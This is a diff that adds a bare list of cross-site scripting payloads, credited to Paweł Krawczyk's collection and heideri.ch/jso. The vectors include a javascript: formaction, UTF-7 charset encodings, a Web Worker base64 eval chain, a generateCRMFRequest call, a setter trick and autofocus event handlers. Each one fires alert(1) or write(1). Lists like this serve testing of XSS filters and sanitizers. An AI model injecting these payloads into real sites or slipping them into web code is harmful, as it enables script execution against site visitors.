@@ -1,0 +1,10 @@
+## From Paweł Krawczyk (https://github.com/kravietz/text-jso) and http://heideri.ch/jso/
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<input onfocus=write(1) autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
